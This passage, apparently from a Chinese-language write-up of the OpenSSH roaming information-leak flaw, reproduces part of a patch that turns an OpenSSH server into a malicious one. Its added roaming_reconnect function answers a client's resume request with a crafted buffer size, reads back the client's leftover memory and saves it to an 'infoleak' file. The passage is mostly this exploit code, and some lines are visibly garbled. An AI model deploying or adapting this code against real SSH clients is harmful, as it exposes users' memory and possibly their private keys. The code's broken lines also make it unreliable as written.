                                packet_put_string(pkalg, alen);
                                packet_put_string(pkblob, blen);
            diff -pruN openssh-6.4p1/kex.c openssh-6.4p1+roaming/kex.c
            --- openssh-6.4p1/kex.c    2013-06-01 14:31:18.000000000 -0700
            +++ openssh-6.4p1+roaming/kex.c       2016-01-07 01:04:15.000000000 -0800
            @@ -442,6 +442,73 @@ proposals_match(char *my[PROPOSAL_MAX],
             }
             static void
            +roaming_reconnect(void)
            +{
            +     packet_read_expect(SSH2_MSG_KEX_ROAMING_RESUME);
            +     const u_int id = packet_get_int(); /* roaming_id */
    +     debug("%s: id %u", __func__, id);
    +     packet_check_eom();
    +
    +     const char *const dir = get_roaming_dir(id);
    +     debug("%s: dir %s", __func__, dir);
    +     const int fd = open(dir, O_RDONLY | O_NOFOLLOW | O_NONBLOCK);
    +     if (fd  MAX_ROAMBUF)
    +            fatal("%s: client_out_buf_size %u", __func__,
    +                      client_out_buf_size);
    +
    +     packet_start(SSH2_MSG_KEX_ROAMING_AUTH_OK);
    +     packet_put_int64(client_write_bytes - (u_int64_t)client_out_buf_size);
    +     packet_send();
    +     const int overflow = (access("output", F_OK) == 0);
    +     if (overflow != 0) {
    +            const void *const ptr = load_roaming_file("output", NULL, &len);
    +            buffer_append(packet_get_output(), ptr, len);
    +     }
    +     packet_write_wait();
    +
    +     char *const client_out_buf = xmalloc(client_out_buf_size);
    +     if (atomicio(read, packet_get_connection_in(), client_out_buf,
    +                          client_out_buf_size) != client_out_buf_size)
    +            fatal("%s: read client_out_buf_size %u errno %d", __func__,
    +                          client_out_buf_size, errno);
    +     if (overflow == 0)
    +            dump_roaming_file("infoleak", client_out_buf,
    +                                       client_out_buf_size);
    +     fatal("%s: all done for %s", __func__, dir);
    +}
    +
    +static void
     kex_choose_conf(Kex *kex)
     {
          Newkeys *newkeys;
    @@ -470,6 +537,10 @@ kex_choose_conf(Kex *kex)
                        kex->roaming = 1;
                        free(roaming);
                 }
    +     } else if (strcmp(peer[PROPOSAL_KEX_ALGS], KEX_RESUME) == 0) {
    +            roaming_reconnect();
    +            /* NOTREACHED */
    +            fatal("%s: returned from %s", __func__, KEX_RESUME);
          }
          /* Algorithm Negotiation */
    diff -pruN openssh-6.4p1/roaming.h openssh-6.4p1+roaming/roaming.h
    --- openssh-6.4p1/roaming.h   2011-12-18 15:52:52.000000000 -0800
    +++ openssh-6.4p1+roaming/roaming.h      2016-01-07 01:04:15.000000000 -0800
    @@ -42,4 +42,86 @@ void     resend_bytes(int, u_int64_t *);
     void     calculate_new_key(u_int64_t *, u_int64_t, u_int64_t);
**由于篇幅有限,在此无法进行详细的讲解,具体信息请查看原文。**